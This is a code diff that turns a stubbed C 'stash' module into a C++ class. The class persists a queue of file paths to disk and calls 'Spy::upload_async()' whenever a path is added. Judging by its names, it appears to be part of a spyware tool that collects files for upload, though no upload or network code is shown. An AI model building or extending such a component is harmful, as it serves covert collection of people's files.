@@ -1,30 +1,58 @@
-#include <stdio.h>
 #include "stash.h"
 
-FILE * stashFileHandle = NULL;
-
-EXPORT BOOL init_stash(const char * filePath)
+void Stash::import_stash()
 {
-	stashFileHandle = fopen(filePath, "a+");
-	return stashFileHandle != NULL;
+	LOG("Import stash...");
+	stg_queue->clear();
+	char * buffer = new char[SPY_TMP_FNAME_LTH];
+	LOG("Read stash file and push to stash...");
+	while (!feof(file_handle) && fgets(buffer, SPY_TMP_FNAME_LTH, file_handle))
+	{
+		stg_queue->push(buffer);
+	}
+	delete[] buffer;
+	LOG("Imported");
 }
 
-VOID push_file(const char * filePath)
+void Stash::export_stash()
 {
-	LOG("stash >> push file '%s'", filePath);
+	reopen("w+b");
+	FILE * _handle = file_handle;
+	bool flag = true;
+	const char * file_path;
+	while ((file_path = stg_queue->peek(flag)) != NULL)
+	{
+		fputs(file_path, file_handle);
+		fputs("\n", file_handle);
+		flag = false;
+	}
 }
 
-BOOL is_empty()
+void Stash::push(const char * file_path)
 {
-	return FALSE;
+	stg_queue->push(file_path);
+	export_stash();
+	Spy::upload_async();
 }
 
-VOID pop_file(const char * buffer)
+bool Stash::empty() const
 {
-	LOG("stash >> pop file");
+	return stg_queue->empty();
 }
 
-VOID close_stash()
+const char * Stash::pop(char * buffer)
 {
-	LOG("stash >> closed");
+	return stg_queue->pop(buffer);
+}
+
+Stash::Stash(const char * file_path)
+	:Storable(file_path, "a+b")
+{
+	stg_queue = new Queue();
+	import_stash();
+}
+
+Stash::~Stash()
+{
+	delete stg_queue;
 }
